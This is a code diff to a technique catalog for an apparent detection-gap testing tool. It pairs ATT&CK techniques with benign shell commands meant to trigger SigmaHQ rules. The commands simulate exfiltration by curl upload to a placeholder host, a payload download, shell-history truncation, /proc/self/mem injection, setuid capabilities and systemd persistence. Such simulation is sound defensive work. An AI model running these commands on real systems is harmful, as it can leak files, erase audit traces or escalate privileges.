@@ -1,13 +1,13 @@
-"""The technique catalog as data — the single source both ``catalog.py`` (metadata)
+"""The technique catalog as data - the single source both ``catalog.py`` (metadata)
 and ``registry.py`` (executable specs) build from.
 
 Every ``detected`` technique is backed by a real shipped detection rule (``rule_file``):
-a verbatim-vendored SigmaHQ ``linux/process_creation`` rule where one exists (23 under
+a verbatim-vendored SigmaHQ ``linux/process_creation`` rule where one exists (31 under
 ``rules/sigmahq/`` plus the setuid rule at ``rules/proc_creation_lnx_setgid_setuid.yml``),
 or a RedGap-authored rule (``rules/redgap/``) for the original kill-chain. Its benign
 command is crafted to trigger that rule. ``gap`` techniques ship no rule (a rule gap) or
 are deliberately too common to alert on with a single event (a base-rate gap). Nothing
-here declares a verdict — ``expected`` only says what was VERIFIED to be produced (so a
+here declares a verdict - ``expected`` only says what was VERIFIED to be produced (so a
 regression is flagged) and, for gaps, which *kind* of gap to label; the detection engine
 computes the actual detected/gap outcome from captured telemetry + rules.
 
@@ -257,7 +257,7 @@ TECHNIQUES: tuple[TechDef, ...] = (
     TechDef(
         "T1548",
         "Abuse Elevation Control Mechanism",
-        ("Privilege Escalation", "Persistence"),
+        ("Privilege Escalation", "Defense Evasion"),
         "Set the setuid capability on an inert /bin/true copy with setcap, then strip it.",
         ("cp /bin/true /tmp/rgcap && setcap cap_setuid+ep /tmp/rgcap || true",),
         ("setcap -r /tmp/rgcap 2>/dev/null; rm -f /tmp/rgcap; true",),
@@ -363,7 +363,7 @@ TECHNIQUES: tuple[TechDef, ...] = (
     TechDef(
         "T1567",
         "Exfiltration Over Web Service",
-        ("Exfiltration", "Command and Control"),
+        ("Exfiltration",),
         "Upload a public file with curl --upload-file (offline; call fails harmlessly).",
         ("curl --upload-file /etc/hostname http://example.com/ || true",),
         ("true",),
@@ -404,7 +404,7 @@ TECHNIQUES: tuple[TechDef, ...] = (
     TechDef(
         "T1653",
         "Power Settings",
-        ("Persistence", "Impact"),
+        ("Persistence",),
         "Mask then unmask a systemd power target.",
         ("systemctl mask hibernate.target || true",),
         ("systemctl unmask hibernate.target 2>/dev/null; true",),
@@ -431,5 +431,132 @@ TECHNIQUES: tuple[TechDef, ...] = (
         ("true",),
         NONE,
         "rules/sigmahq/proc_creation_lnx_susp_process_reading_sudoers.yml",
+    ),
+    # ---- v1.0 expansion: detected (each vendors a real SigmaHQ corpus rule) ----
+    TechDef(
+        "T1007",
+        "System Service Discovery",
+        ("Discovery",),
+        "Enumerate cron jobs with crontab -l (SigmaHQ maps this crontab enumeration to T1007).",
+        ("crontab -l 2>/dev/null || true",),
+        ("true",),
+        NONE,
+        "rules/sigmahq/proc_creation_lnx_crontab_enumeration.yml",
+    ),
+    TechDef(
+        "T1049",
+        "System Network Connections Discovery",
+        ("Discovery",),
+        "List logged-in users / sessions with who.",
+        ("who",),
+        ("true",),
+        NONE,
+        "rules/sigmahq/proc_creation_lnx_system_network_connections_discovery.yml",
+    ),
+    TechDef(
+        "T1027",
+        "Obfuscated Files or Information",
+        ("Defense Evasion",),
+        "Decode a base64 string with the base64 utility (payload decodes to 'redgap').",
+        ("echo cmVkZ2Fw | base64 -d",),
+        ("true",),
+        NONE,
+        "rules/sigmahq/proc_creation_lnx_base64_decode.yml",
+    ),
+    TechDef(
+        "T1036",
+        "Masquerading",
+        ("Defense Evasion",),
+        "Run an inert /bin/true copy dropped in /tmp (location-based masquerade signal).",
+        ("cp /bin/true /tmp/rgmasq && /tmp/rgmasq",),
+        ("rm -f /tmp/rgmasq",),
+        NONE,
+        "rules/sigmahq/proc_creation_lnx_susp_execution_tmp_folder.yml",
+    ),
+    TechDef(
+        "T1055.009",
+        "Process Injection: Proc Memory",
+        ("Defense Evasion", "Privilege Escalation"),
+        "Point dd at /proc/self/mem with a zero-byte source (if=/dev/null; nothing is written).",
+        ("dd if=/dev/null of=/proc/self/mem 2>/dev/null || true",),
+        ("true",),
+        NONE,
+        "rules/sigmahq/proc_creation_lnx_dd_process_injection.yml",
+    ),
+    TechDef(
+        "T1070",
+        "Indicator Removal",
+        ("Defense Evasion",),
+        "Remove a (non-existent) package with dpkg to erase traces (offline no-op).",
+        ("dpkg --remove redgap-nonexistent 2>/dev/null || true",),
+        ("true",),
+        NONE,
+        "rules/sigmahq/proc_creation_lnx_remove_package.yml",
+    ),
+    TechDef(
+        "T1105",
+        "Ingress Tool Transfer",
+        ("Command and Control",),
+        "Fetch a payload with curl (offline; the loopback request refuses harmlessly).",
+        ("curl -s http://127.0.0.1:9/rgpayload -o /tmp/rgdl 2>/dev/null || true",),
+        ("rm -f /tmp/rgdl",),
+        NONE,
+        "rules/sigmahq/proc_creation_lnx_curl_usage.yml",
+    ),
+    TechDef(
+        "T1531",
+        "Account Access Removal",
+        ("Impact",),
+        "Create and immediately delete a throwaway group with groupdel.",
+        ("groupadd rg_grp 2>/dev/null; groupdel rg_grp 2>/dev/null || true",),
+        ("groupdel rg_grp 2>/dev/null; true",),
+        NONE,
+        "rules/sigmahq/proc_creation_lnx_groupdel.yml",
+    ),
+    # ---- v1.0 expansion: honest rule gaps (real telemetry, no rule fires) ----
+    TechDef(
+        "T1201",
+        "Password Policy Discovery",
+        ("Discovery",),
+        "Read the account password-aging policy with chage (no rule ships: rule gap).",
+        ("chage -l root 2>/dev/null || true",),
+        ("true",),
+        RULE,
+    ),
+    TechDef(
+        "T1614.001",
+        "System Location Discovery: System Language Discovery",
+        ("Discovery",),
+        "Print the host locale/language configuration (rule gap).",
+        ("locale 2>/dev/null || true",),
+        ("true",),
+        RULE,
+    ),
+    TechDef(
+        "T1613",
+        "Container and Resource Discovery",
+        ("Discovery",),
+        "Read PID 1's cgroup to confirm containerization (rule gap; corpus maps this to T1082).",
+        ("cat /proc/1/cgroup 2>/dev/null || true",),
+        ("true",),
+        RULE,
+    ),
+    TechDef(
+        "T1070.003",
+        "Indicator Removal: Clear Command History",
+        ("Defense Evasion",),
+        "Zero the shell history file with truncate (rule gap: only rm/shred/unlink are covered).",
+        ("truncate -s 0 /root/.bash_history 2>/dev/null || true",),
+        ("true",),
+        RULE,
+    ),
+    TechDef(
+        "T1543.002",
+        "Create or Modify System Process: Systemd Service",
+        ("Persistence", "Privilege Escalation"),
+        "Plant an inert file under /etc/systemd/system (rule gap; unit-file writes are uncovered).",
+        ("cp /etc/hostname /etc/systemd/system/redgap-test.service 2>/dev/null || true",),
+        ("rm -f /etc/systemd/system/redgap-test.service",),
+        RULE,
     ),
 )
